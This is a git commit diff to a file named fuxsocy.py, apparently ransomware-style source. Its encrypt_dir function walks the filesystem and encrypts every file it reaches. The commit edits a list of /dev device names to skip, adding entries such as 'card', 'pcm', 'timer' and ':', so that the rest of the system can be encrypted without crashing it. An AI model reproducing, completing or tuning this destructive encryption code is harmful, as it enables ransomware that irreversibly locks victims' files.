274b3e8c00f403ba173ca59abdd2439352e667e0
Joe Kendal <kendaljoe0@gmail.com>
2017-05-21 15:26:12 +0100

    Update fuxsocy.py

--- fuxsocy.py
+++ fuxsocy.py
@@ -69,7 +69,7 @@ def encrypt_dir(directory, key):
             path = root + '/' + file
             try:
                 if '/dev' in path[:4]:
-                    if not any(substring in file for substring in ('dm-', 'sda', 'port', 'vcs', 'tty', 'initctl', 'stderr', 'stdin', 'stdout', 'sg', 'hidraw', 'psaux', 'ptmx', 'console', 'random', 'zero', 'mem', 'rfkill', 'dri', 'snd', 'disk', 'block', 'char')):
+                    if not any(substring in file for substring in ('dm-', 'sda', 'port', 'vcs', 'tty', 'initctl', 'stderr', 'stdin', 'stdout', 'sg', 'hidraw', 'psaux', 'ptmx', 'console', 'random', 'zero', 'mem', 'rfkill', 'card', 'control', 'pcm', 'seq', 'timer', '-', ':', 'disk', 'block', 'char')):
                         encrypt(path, key)
                 else:
                     encrypt(path, key)
